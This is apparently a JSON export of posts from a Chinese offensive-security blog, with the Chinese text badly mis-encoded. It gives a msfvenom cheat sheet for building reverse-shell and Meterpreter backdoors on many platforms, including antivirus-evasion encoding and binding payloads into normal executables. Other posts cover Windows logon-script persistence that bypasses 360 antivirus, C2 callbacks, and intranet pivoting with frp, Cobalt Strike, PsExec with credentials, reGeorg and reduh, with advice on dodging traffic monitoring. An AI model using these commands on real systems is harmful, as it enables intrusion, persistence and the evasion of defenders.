å‚æ•°è¯¦è§£ä¸ºäº†å¼€å§‹ä½¿ç”¨ msfvenomï¼Œå¯ä»¥é¦–å…ˆæµè§ˆä¸€ä¸‹å®ƒæ‰€æ”¯æŒçš„å‘½ä»¤å‚æ•°ï¼š -l æŸ¥çœ‹æ‰€æœ‰payloadã€‚ -p æ·»åŠ è½½è·payloadã€‚ è½½è·è¿™ä¸ªä¸œè¥¿æ¯”è¾ƒå¤šï¼Œè¿™ä¸ªè½¯ä»¶å°±æ˜¯æ ¹æ®å¯¹åº”çš„è½½è·payloadç”Ÿæˆå¯¹åº”å¹³å°ä¸‹çš„åé—¨ï¼Œæ‰€ä»¥åªæœ‰é€‰å¯¹payloadï¼Œå†å¡«å†™æ­£ç¡®è‡ªå·±çš„IPï¼ŒPORTå°±å¯ä»¥ç”Ÿæˆå¯¹åº”è¯­è¨€ï¼Œå¯¹åº”å¹³å°çš„åé—¨äº†ã€‚ (- -payload-options åˆ—å‡ºpayloadé€‰é¡¹) -f è¾“å‡ºæ–‡ä»¶æ ¼å¼ã€‚ (- -help-formats åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶æ ¼å¼) å¯æ‰§è¡Œæ ¼å¼ï¼š asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war è½¬æ¢æ ¼å¼ï¼š bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript -e ç¼–ç å…æ€ã€‚ -a é€‰æ‹©æ¶æ„å¹³å° x86 | x64 | x86_64 Platforms: windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframeã€‚ -o æ–‡ä»¶è¾“å‡ºã€‚ -n ä¸ºpayloadæŒ‡å®šä¸€ä¸ª nopsled é•¿åº¦ ã€‚ -b é¿å…ä½¿ç”¨çš„å­—ç¬¦ ä¾‹å¦‚ï¼šä¸ä½¿ç”¨ â€˜\\0fâ€™ã€‚ -s ç”Ÿæˆpayloadçš„æœ€å¤§é•¿åº¦ï¼Œå°±æ˜¯æ–‡ä»¶å¤§å°ã€‚ -i ç¼–ç æ¬¡æ•°ã€‚ -c æ·»åŠ è‡ªå·±çš„shellcodeã€‚ -x | -k æ†ç»‘ã€‚ä¾‹å¦‚ï¼šåŸå…ˆæœ‰ä¸ªæ­£å¸¸æ–‡ä»¶normal.exe å¯ä»¥é€šè¿‡è¿™ä¸ªé€‰é¡¹æŠŠåé—¨æ†ç»‘åˆ°è¿™ä¸ªç¨‹åºä¸Šé¢ã€‚ å¦‚ä½•ç”Ÿæˆ Payloadä¸ºäº†ç”Ÿæˆ Payloadï¼Œéœ€è¦é…ç½®ä¸¤ä¸ªå¿…è¦çš„å‚æ•°ï¼ˆ-p ä¸ -fï¼‰ã€‚ å…¸å‹ç”Ÿæˆ1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f exe &gt; shell.exe ç¼–ç å¤„ç†å‹-i å‚æ•°æ¥å°†ä¸€ä¸ª payload ç¼–ç å¤šæ¬¡ï¼Œæœ‰æ—¶å€™å¤šæ¬¡ç¼–ç å¯ä»¥ç»•è¿‡é˜²ç—…æ¯’è½¯ä»¶çš„æ£€æµ‹ï¼ˆä¿—ç§°å…æ€ï¼‰ï¼Œä½†è¦çŸ¥é“çš„æ˜¯ï¼šç¼–ç å¹¶ä¸èƒ½çœŸæ­£ä½œä¸ºå…æ€çš„è§£å†³æ–¹æ¡ˆã€‚ -eé€‰é¡¹æ¥å¼€å¯ payload ç¼–ç åŠŸèƒ½ã€‚ 1msfvenom â€“p windows/meterpreter/reverse_tcp â€“i 3 â€“e x86/shikata_ga_nai LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; â€“f exe â€“o C:\\back.exe æ†ç»‘12msfvenom â€“p windows/meterpreter/reverse_tcp â€“platform windows â€“a x86 â€“x C:\\nomal.exe â€“k LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; â€“f exe â€“o C:\\shell.exe è¾“å‡ºä¸²è”å¦‚ä½•å°† msfvenom çš„è¾“å‡ºä¸²è”èµ·æ¥ï¼ˆåˆ©ç”¨æ“ä½œç³»ç»Ÿç®¡é“çš„é‡å®šå‘ç‰¹æ€§ï¼‰ã€‚ ä»¥å‰æ—§çš„ msfpayload ä¸ msfencode ç»å¸¸ä¸²è”ä½¿ç”¨ï¼Œå¹¶æŒ‰ç…§å¤šç§ç¼–ç é¡ºåºæ’åˆ—ã€‚msfvenom ä¹Ÿå¯ä»¥è¢«è¿™æ ·ä½¿ç”¨ï¼š 123msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw -e x86/shikata_ga_nai -i 5 | \\msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \\msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe ç³»ç»ŸLinux 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f elf &gt; shell.elf Windows 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f exe &gt; shell.exe Mac 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f macho &gt; shell.macho WebPHP 1msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.php ASP 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f asp &gt; shell.asp JSP 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.jsp WAR 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f war &gt; shell.war è„šæœ¬Python 1msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.py Bash 1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.sh Perl 1msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.pl Shellcode æœ‰å…³æ‰€æœ‰shellcodeï¼Œè¯·å‚é˜…msfvenom -help-formatsä»¥è·å–æœ‰å…³æœ‰æ•ˆå‚æ•°çš„ä¿¡æ¯ã€‚ åŸºäºLinuxçš„Shellcode 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f &lt;language&gt; åŸºäºWindowsçš„Shellcode 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f &lt;language&gt; åŸºäºMacçš„Shellcode 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f &lt;language&gt; ç›‘å¬12345msf5 &gt; use exploit/multi/handlermsf5 &gt; set payload &lt;payloadåç§°&gt;msf5 &gt; set lhost/rhost &lt;æœ¬åœ°IP/ç›®æ ‡IP&gt;msf5 &gt; set lport &lt;æœ¬åœ°ç«¯å£&gt;msf5 &gt; run -j -z Reference How to use msfvenom","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"Windowsæƒé™ç»´æŒä¹‹LogonScripts","slug":"Windowsæƒé™ç»´æŒä¹‹LogonScripts","date":"2020-01-06T09:19:19.000Z","updated":"2021-07-07T07:16:35.866Z","comments":true,"path":"2020/0106/.html","link":"","permalink":"https://payloads.cn/2020/0106/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn ç®€ä»‹Logon Scriptsæ˜¯ç³»ç»Ÿçš„ç™»å½•è„šæœ¬ï¼Œè¿™é‡Œè¯´ä¸€ä¸ªç‰¹åˆ«ç”¨æ³•ï¼Œ Logon Scriptsèƒ½å¤Ÿä¼˜å…ˆäºå®‰å…¨è½¯ä»¶æ‰§è¡Œï¼Œç»•è¿‡å®‰å…¨è½¯ä»¶å¯¹æ•æ„Ÿæ“ä½œçš„æ‹¦æˆªï¼Œæœ¬æ–‡å°†å…·ä½“ä»‹ç»è¿™ä¸ªæŠ€å·§ã€‚ Logon Scriptsç”¨æ³•æ‹¦æˆªæµ‹è¯•cmdè¾“å…¥å¦‚ä¸‹ä»£ç ï¼ˆå®‰å…¨è½¯ä»¶æ‹¦æˆªï¼‰ 1wmic ENVIRONMENT create name=&quot;AnonySec&quot;,username=&quot;%username%&quot;,VariableValue=&quot;Logon Scripts!&quot; è®¾ç½®Logon Scripts1.batä»£ç å¦‚ä¸‹ 1234wmic ENVIRONMENT create name=&quot;AnonySec&quot;,username=&quot;%username%&quot;,VariableValue=&quot;Logon Scripts!&quot;reg query HKEY_CURRENT_USER\\Environment /V AnonySecpause å¯ç”¨Logon Scriptsæ³¨å†Œè¡¨è·¯å¾„ï¼šHKCU\\Environment åˆ›å»ºå­—ç¬¦ä¸²é”®å€¼ï¼š UserInitMprLogonScript é”®å€¼è®¾ç½®ä¸ºbatçš„ç»å¯¹è·¯å¾„ï¼šC:\\1.bat ç»•è¿‡360å¯¹wmiè°ƒç”¨çš„æ‹¦æˆªç”±äºè°ƒç”¨WMIä¼šè¢«æ‹¦æˆªï¼Œå¯ä»¥é€šè¿‡powershellå®ç°æ·»åŠ æ³¨å†Œè¡¨é”®å€¼ï¼Œå¯åŠ¨Logon Scriptsï¼Œä»£ç å¦‚ä¸‹ï¼š 1New-ItemProperty &quot;HKCU:Environment&quot; UserInitMprLogonScript -value &quot;C:\\1.bat&quot; -propertyType string | Out-Null é‡æ–°ç™»å½•æ³¨é”€è®¡ç®—æœºé‡æ–°ç™»å½•ã€‚å¦‚æœæ³¨å†Œè¡¨HKCU\\EnvironmentæˆåŠŸè¢«å†™å…¥é”®å€¼AnonySec REG_SZ Logon Scripts!ï¼Œè¯´æ˜Logon Scriptsä¼˜å…ˆäºå®‰å…¨è½¯ä»¶æ‰§è¡Œï¼Œç»•è¿‡å®‰å…¨è½¯ä»¶çš„é™åˆ¶ã€‚ ä¸Šçº¿C2ä»¥MSFä¸ºä¾‹ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆpayloadï¼Œåˆ©ç”¨Logon Scriptsåå¼¹msf shellï¼Œè¿›è¡Œæƒé™çš„ç»´æŒã€‚ 1234567sudo msfconsole -qmsf5 &gt; use exploit/multi/script/web_deliverymsf5 exploit(multi/script/web_delivery) &gt; set target 2msf5 exploit(multi/script/web_delivery) &gt; set payload windows/x64/meterpreter/reverse_httpmsf5 exploit(multi/script/web_delivery) &gt; set lhost 10.11.42.99msf5 exploit(multi/script/web_delivery) &gt; set lport 5353msf5 exploit(multi/script/web_delivery) &gt; run -j","categories":[{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"å®æˆ˜ä¸­å†…ç½‘ç©¿é€çš„æ‰“æ³•","slug":"å®æˆ˜ä¸­å†…ç½‘ç©¿é€çš„æ‰“æ³•","date":"2020-01-05T13:35:48.000Z","updated":"2021-08-06T02:37:10.697Z","comments":true,"path":"2020/0105/.html","link":"","permalink":"https://payloads.cn/2020/0105/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€åœ¨å†…ç½‘æ¸—é€æ—¶ï¼Œä¸€ä¸ªWebShellæˆ–CobaltStrikeã€Metasploitä¸Šçº¿ç­‰ï¼Œåªæ˜¯å¼€ç«¯ï¼Œæ›´å¤šæ˜¯è¦å†…ç½‘æ¨ªå‘ç§»åŠ¨ï¼Œæ‰©å¤§æˆ˜æœï¼Œæ‰“åˆ°æ ¸å¿ƒåŒºåŸŸã€‚ä½†åæ¸—é€çš„å‰ææ˜¯éœ€è¦æ­å»ºä¸€æ¡é€šå‘å†…ç½‘çš„â€œä¸“å±é€šé“â€ï¼Œæ‰èƒ½è¿›ä¸€æ­¥æ”»å‡»ã€‚å¯å®æˆ˜ä¸­å› ä¸ºç½‘ç»œç¯å¢ƒä¸åŒï¼Œæ‰€åˆ©ç”¨çš„æ–¹å¼å°±ä¸åŒã€‚ ä»¥ä¸‹ä¸ºè‡ªæˆ‘æ€»ç»“â€œå®æˆ˜ä¸­å†…ç½‘ç©¿é€çš„æ‰“æ³•â€æ€ç»´å¯¼å›¾ï¼š ç›®æ ‡å‡ºç½‘ï¼ˆsocksä»£ç†ï¼‰è¿™æ˜¯å®æˆ˜ä¸­æœ€æ„¿æ„ç¢°åˆ°çš„ç½‘ç»œç¯å¢ƒï¼Œç›®æ ‡æœºå¯ä»¥æ­£å¸¸è®¿é—®äº’è”ç½‘ï¼Œå¯ç›´æ¥åœ¨ç›®æ ‡æœºæŒ‚socksä»£ç†æˆ–CobaltStrikeä¸Šçº¿ï¼Œæ‰“é€šç›®æ ‡çš„å†…ç½‘é€šé“ã€‚ Frpï¼ˆsocks5ï¼‰FrpæœåŠ¡ç«¯é…ç½®æ–‡ä»¶ï¼š 12[common]bind_port = 8080 Frpå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ï¼š 1234567891011121314[common]server_addr = xx.xx.xx.xxserver_port = 8080#æœåŠ¡ç«¯å£ä½¿ç”¨Webå¸¸è§ç«¯å£[socks5]type = tcpremote_port = 8088plugin = socks5use_encryption = true use_compression = true#socks5å£ä»¤#plugin_user = SuperMan#plugin_passwd = XpO2McWe6nj3 æ­¤å¤„æ·»åŠ äº†åŠ å¯†å‹ç¼©è¿™ä¸¤ä¸ªåŠŸèƒ½ï¼Œé»˜è®¤æ˜¯ä¸å¼€å¯çš„ï¼Œæ ¹æ®ä½œè€…ä»‹ç»ï¼Œå‹ç¼©ç®—æ³•ä½¿ç”¨çš„æ˜¯ snappyã€‚ use_encryption = true å¯ç”¨åŠ å¯† [é€šä¿¡å†…å®¹åŠ å¯†ä¼ è¾“ï¼Œæœ‰æ•ˆé˜²æ­¢æµé‡è¢«æ‹¦æˆª] use_compression = true å¯ç”¨å‹ç¼© [ä¼ è¾“å†…å®¹è¿›è¡Œå‹ç¼©ï¼Œæœ‰æ•ˆå‡å°ä¼ è¾“çš„ç½‘ç»œæµé‡ï¼ŒåŠ å¿«æµé‡è½¬å‘é€Ÿåº¦ï¼Œä½†ä¼šé¢å¤–æ¶ˆè€—ä¸€äº›CPUèµ„æº] use_encryption = true ã€use_compression = true å¿…é¡»æ”¾åœ¨ç›¸å…³åè®®ä¸‹é¢ã€‚ frpå®¢æˆ·ç«¯ä¸é…ç½®æ–‡ä»¶ä¼ åˆ°ç›®æ ‡æœºåï¼ŒæŠŠç¨‹åºåä¸é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œå¹¶æ”¾åœ¨ç³»ç»Ÿç›¸å…³æ–‡ä»¶å¤¹ä¸­ï¼Œåšåˆ°éšè”½ã€‚ åŠ å¯†å‹ç¼©çš„å¯¹æ¯”è¿™æ˜¯frpå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ä¸­æœªä½¿ç”¨encryption ä¸compressionåŠŸèƒ½ï¼Œåˆ©ç”¨metasploitæŒ‚socksä»£ç†ï¼Œæ‰«æms17_010ä¼ è¾“çš„æ•°æ®åŒ…ï¼Œæ˜æ˜¾å¯è¾¨åˆ«å‡ºå…·ä½“æ”»å‡»è¡Œä¸ºã€‚å¦‚æœç›®æ ‡å†…ç½‘æœ‰â€æ€åŠ¿æ„ŸçŸ¥â€œã€æµé‡åˆ†æç­‰å®‰å…¨è®¾å¤‡ï¼Œå°±ä¼šè¢«ç›‘æµ‹åˆ°ï¼Œå¯¼è‡´æƒé™ä¸¢å¤±ã€‚ ä½¿ç”¨encryption ä¸compressionåŠŸèƒ½åï¼Œè™½æ”»å‡»æºåœ°å€åŒæ ·ä¼šæš´éœ²ï¼Œä½†ä¼ è¾“çš„æ•°æ®åŒ…å´æ— æ³•è¾¨åˆ«ï¼Œè§„é¿äº†å†…ç½‘ä¸­çš„å®‰å…¨ç›‘æµ‹è®¾å¤‡ã€‚ CobaltStrike (socks4a)åˆ°å·²æ§ç›®æ ‡æœºçš„Beaconä¸‹å°†socksä»£ç†å¼€å¯ã€‚ 1beacon &gt; socks 1024 #ç«¯å£æ ¹æ®VPSå®é™…æƒ…å†µè¿›è¡Œè®¾ç½® èœå•æ ä¸­çš„View &gt; Proxy Pivotsï¼Œå¤åˆ¶ä»£ç†è¿æ¥åˆ°Metasploitä¸­ï¼Œæˆ–ç›´æ¥å°†socks4aæŒ‚åœ¨ç›¸å…³å®‰å…¨å·¥å…·ä¸­ã€‚ ä¸Šçº¿ä¸å‡ºç½‘æœºå™¨è¿™æ˜¯linké“¾æ¥ï¼Œåªè¦ä¸»é“¾è·¯(å‡ºç½‘æœºBeacon)æ‰çº¿ï¼Œå‡æ‰ï¼ SMB Beaconå®˜æ–¹å¯¹SMB Beaconçš„ä»‹ç»ï¼šSMB Beaconæ˜¯ä½¿ç”¨å‘½åç®¡é“é€šè¿‡çˆ¶çº§Beaconè¿›è¡Œé€šè®¯ï¼Œå½“ä¸¤ä¸ªBeaconsé“¾æ¥åï¼Œå­Beaconä»çˆ¶Beaconè·å–åˆ°ä»»åŠ¡å¹¶å‘é€ã€‚å› ä¸ºé“¾æ¥çš„Beaconsä½¿ç”¨Windowså‘½åç®¡é“è¿›è¡Œé€šä¿¡ï¼Œæ­¤æµé‡å°è£…åœ¨SMBåè®®ä¸­ï¼Œæ‰€ä»¥SMB Beaconç›¸å¯¹éšè”½ã€‚ åˆ›å»ºä¸€ä¸ªSMBçš„Listener (hostä¸portå¯æ— è§†)ï¼Œæ³¨æ„Listeneré€‰æ‹©ï¼Œåœ¨sessionä¸­é€‰æ‹©routeå¯è¾¾çš„ä¸»æœºæ´¾ç”Ÿä¼šè¯ã€‚ è¿è¡ŒæˆåŠŸåï¼Œå¯ä»¥çœ‹åˆ° âˆâˆ è¿™ä¸ªå­—ç¬¦ï¼Œè¿™å°±æ˜¯æ´¾ç”ŸSMB Beaconçš„è¿æ¥çŠ¶æ€ã€‚ å¯åœ¨ä¸»Beaconä¸Šç”¨link hosté“¾æ¥æˆ–unlink hostæ–­å¼€ã€‚ 12beacon&gt; link 192.168.144.155beacon&gt; unlink 192.168.144.155 Link Listeneråœ¨å·²ä¸Šçº¿çš„ä¸»æœºåˆ›å»ºListenerã€‚ å¯¼å‡ºè¯¥ç±»å‹Listenerå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶æˆ–dllç­‰ã€‚ é€‰æ‹©åˆšå»ºç«‹çš„Listenerã€‚ ä¸Šä¼ åˆšæ‰ç”Ÿæˆçš„payloadåˆ°å½“å‰å·²ä¸Šçº¿çš„ç›®æ ‡æœºä¸­ï¼Œè¿™é‡Œç”¨PsExec.exe å·¥å…· ã€‚(CobalStrikeæœ¬èº«psexecåŠŸèƒ½ä¸å¤Ÿå¼ºå¤§) åœ¨Beaconä¸­ä½¿ç”¨PsExecå·¥å…·å°†payloadä¸Šä¼ åˆ°ä¸å‡ºç½‘çš„ç›®æ ‡æœºä¸­ï¼Œè‡ªåŠ¨æ‰§è¡Œï¼Œä¸Šçº¿ã€‚ 1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe 1beacon&gt; shell netstat -ano |findstr 4444 SSH Login12beacon&gt; ssh 192.168.144.174:22 root adminbeacon&gt; ssh 192.168.144.203:22 root admin åœ¨Linuxç›®æ ‡æœºä¸­æŸ¥çœ‹ç½‘ç»œè¿æ¥çŠ¶æ€ï¼Œå®é™…æ˜¯ä¸ä¹‹å‰å·²ä¸Šçº¿çš„Windowsä¸»æœºå»ºç«‹çš„è¿æ¥ã€‚ ç›®æ ‡ä¸å‡ºç½‘ï¼ˆhttpä»£ç†ï¼‰ç›®æ ‡æœºç½‘ç»œä¸­å¯èƒ½æœ‰é˜²ç«å¢™ã€ç½‘é—¸ç­‰ï¼Œåªå…è®¸httpå•å‘å‡ºï¼Œæ— æ³•æ­£å¸¸è®¿é—®äº’è”ç½‘ï¼Œç”¨ä¸Šè¿°socksæ–¹æ³•æ˜¯è¡Œä¸é€šçš„ï¼Œåªèƒ½ç”¨httpä»£ç†è¿›è¡Œæ¸—é€ã€‚ reGeorg (socks5)1python reGeorgSocksProxy.py -u http://192.168.144.211/tunnel.aspx -l 0.0.0.0 -p 10080 åˆ©ç”¨metasploitæŒ‚reGeorg socksä»£ç†ï¼Œæ‰«æms17_010ä¼ è¾“çš„æ•°æ®åŒ…ï¼Œæ˜æ˜¾å¯è¾¨åˆ«æ”»å‡»è¡Œä¸ºã€‚ Neo-reGeorg (åŠ å¯†)1python neoreg.py -k test@123 -l 0.0.0.0 -p 10081 -u http://192.168.144.211/neo-tunnel.aspx ä½¿ç”¨Neo-reGeorgåï¼Œæ•°æ®åŒ…å·²è¢«åŠ å¯†ä¼ è¾“ã€‚ å†°è (å¼€socks5)å†°èçš„æ•°æ®åŒ…ä¼ è¾“æ˜¯åŠ å¯†çš„ï¼Œæœ¬èº«ä¹Ÿå…·å¤‡socksä»£ç†åŠŸèƒ½ï¼Œä½†ä¼ è¾“è¿‡ç¨‹ä¸­å­˜åœ¨ä¸¢åŒ…æƒ…å†µã€‚è¿™é‡ŒåŒæ ·æ˜¯åˆ©ç”¨metasploitæ¢æµ‹ms17_010æ¼æ´ï¼Œç»“æœæ˜¾ç¤ºä¸å­˜åœ¨ã€‚å½“ä¸è®¾ç½®ä»£ç†æ¢æµ‹æ—¶ï¼Œå®é™…æ¼æ´æ˜¯å­˜åœ¨çš„ã€‚ è™½ç„¶å†°èçš„è¿™ç§ä»£ç†æ‰«ææ–¹å¼ä¸å¦‚reGeorgå‡†ç¡®ï¼Œä½†å°çº¿ç¨‹çš„ç«¯å£æ¢æµ‹ç­‰æ˜¯å¯è¡Œçš„ï¼Œå¦‚ auxiliary/scanner/portscan/tcpã€‚å‡†ç¡®åº¦æ›´å¤šæ˜¯å› æŸç§æ¢æµ‹æˆ–å…¶ä»–æ–¹å¼çš„æ•°æ®åŒ…åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„å¤šå°‘è€Œå†³å®šã€‚ reduh (å•ç«¯å£è½¬å‘)å½“ç›®æ ‡æœåŠ¡å™¨ä¸­é—´ä»¶ç­‰æœåŠ¡ç‰ˆæœ¬è¾ƒä½ï¼ŒreGeorgæˆ–å†°èé©¬ç­‰æ— æ³•æ­£å¸¸è§£æï¼Œå°±éœ€è¦æ¢ç”¨å…¶å®ƒçš„httpä»£ç†è„šæœ¬ã€‚è¿™æ˜¯æŸå®æˆ˜ä¸­é‡åˆ°çš„ç¯å¢ƒï¼š è¿™é‡Œä»¥reduhä¸ºä¾‹ï¼Œè™½ç„¶åªèƒ½å¯¹æŒ‡å®šçš„ç«¯å£è¿›è¡Œè½¬å‘ (ä¸é€‚ç”¨å›¾å½¢åŒ–è¿æ¥æ“ä½œ)ï¼Œä½†å¯ä»¥å…ˆåˆ©ç”¨msfvenomç”Ÿæˆæ­£å‘çš„shell payloadï¼Œå†ç»“åˆreduhå•ç«¯å£è½¬å‘ï¼Œä¸Šçº¿metasploitï¼Œæœ€ååˆ©ç”¨socks4aæ¨¡å—å¼€ä»£ç†ã€‚ ä¸‹é¢æŠŠå…·ä½“çš„æµç¨‹èµ°ä¸€éï¼š 12345sudo msfvenom --platform windows -p windows/shell_bind_tcp lport=53 -e x86/shikata_ga_nai -i 5 -f exe -o x86shell.exe--platform &lt;platform&gt; æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°-e, --encoder &lt;encoder&gt; æŒ‡å®šéœ€è¦ä½¿ç”¨çš„ç¼–ç å™¨-i, --iterations &lt;count&gt; æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•° ä¸Šä¼ payloadåˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶æ‰§è¡Œã€‚ metasploitæ˜¯ç›‘å¬è½¬å‘åçš„åœ°å€ä¸ç«¯å£ã€‚ 123456sudo msfconsole -qmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/shell_bind_tcpmsf5 exploit(multi/handler) &gt; set rhost 127.0.0.1msf5 exploit(multi/handler) &gt; set lport 5353msf5 exploit(multi/handler) &gt; run -j reDuhServerä¼ åˆ°ç›®æ ‡æœºåï¼Œä½¿ç”¨reDuhClientè¿›è¡Œè¿æ¥ï¼Œå¹¶å°†åå¼¹çš„ç«¯å£è½¬æœ¬åœ°åï¼Œ 1234java -jar reDuhClient.jar http://103.242.xx.xx/reduh.aspxtelnet 127.0.0.1 1010 &gt;&gt;[createTunnel]5353:127.0.0.1:53 å¯åœ¨metasploitæ¸—é€ï¼Œæˆ–å¼€å¯ä¸€ä¸ªsocks4aï¼ŒæŒ‚è½½å…¶ä»–å®‰å…¨å·¥å…·ä¸Šç»§ç»­æ¸—é€ã€‚ 123msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4amsf5 auxiliary(server/socks4a) &gt; set srvport 10080msf5 auxiliary(server/socks4a) &gt; run -j æ³¨æ„ä¸ºä»€ä¹ˆpayloadè¦ç”¨shellï¼Œè€Œä¸ç”¨meterpreterã€‚meterpreteræ˜¯é«˜çº§çš„payloadï¼Œä¼ è¾“ä¸­å ç”¨å¤§é‡æ•°æ®åŒ…ï¼Œè¿™ç§å•ç«¯å£è½¬å‘ä¸Šçº¿metasploitï¼Œæœ¬å°±ä¸æ˜¯å¾ˆç¨³å®šï¼Œmeterpreterä¼šä½¿â€œå°æ°´ç®¡â€æ›´åŠ ä¸ç¨³å®šï¼ éš”ç¦»ç½‘ç»œï¼ˆå¤šçº§ä»£ç†ï¼‰å†…ç½‘æ¸—é€ä¸­ï¼Œä¼šé‡åˆ°éš”ç¦»ç½‘ç»œï¼Œæ›´å¤šæ—¶å€™æ˜¯é€»è¾‘ä¸Šçš„éš”ç¦»ï¼Œçªç ´çš„åŠæ³•å°±æ˜¯æ‹¿åˆ°routeå¯è¾¾çš„è·³æ¿æœº (å¤šå¼ ç½‘å¡ã€è¿ç»´æœºç­‰)çš„æƒé™ï¼Œå»ºç«‹ä¸€å±‚äºŒçº§ä»£ç†ã€ä¸‰çº§ä»£ç†â€¦ frpç°æ‹¿åˆ°ä¸€å°åŒç½‘å¡å†…ç½‘æœåŠ¡å™¨æƒé™ï¼Œå¯ä»¥ç”¨frpå»ºç«‹é€šé“ï¼Œè¿™å°æœåŠ¡å™¨æ—¢æ˜¯æœåŠ¡ç«¯ä¹Ÿæ˜¯å®¢æˆ·ç«¯ã€‚ proxifierç”¨frpå»ºç«‹å¥½åï¼Œç»“åˆproxifieræ·»åŠ ä¸¤æ¡ä»£ç†ï¼šå¤–ç½‘socksã€å†…ç½‘socksï¼Œä¹‹ååˆ›å»ºä»£ç†é“¾ ã€‚(æ³¨æ„ä»£ç†é¡ºåº) è®¾ç½®ä»£ç†è§„åˆ™ï¼Œé€‰æ‹©å¯¹åº”ä»£ç†ã€‚ äºŒå±‚ä»£ç†æˆåŠŸï¼Œå†…ç½‘éš”ç¦»æœº445æ¢æµ‹å¼€æ”¾ã€‚ Proxychainså‘½ä»¤è¡Œä»£ç†ç¥å™¨proxychainsï¼Œè®¾ç½®äºŒå±‚ä»£ç†ã€sockså£ä»¤ã€‚(æ³¨æ„ä»£ç†é¡ºåº) è”åŠ¨metasploitï¼Œms17_010æ¢æµ‹ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç†é“¾çš„ä¼ è¾“è¿‡ç¨‹ã€‚ Metasploité’ˆå¯¹metasploitçš„åˆ©ç”¨ï¼Œåªè¦sessionsä¸­çš„routeå¯è¾¾ï¼Œå°±å¯ä»¥ç›´æ¥è¿›è¡Œå¤šå±‚ç½‘ç»œæ¸—é€ï¼Œæ›´åŠ æ–¹ä¾¿ã€‚ä½†ä¸»sessionæ‰ï¼Œå‡æ‰ï¼ åœ¨è·å–ç›®æ ‡ä¸€ä¸ªsessions åï¼Œå¯ä»¥æŸ¥çœ‹IPæ®µä¿¡æ¯å¹¶è‡ªåŠ¨æ·»åŠ è·¯ç”±è¡¨ã€‚ 123456msf5 exploit(multi/handler) &gt; sessions 1meterpreter &gt; run get_local_subnetsmeterpreter &gt; run autoroute -pmeterpreter &gt; run post/multi/manage/autoroutemeterpreter &gt; run autoroute -pmeterpreter &gt; background 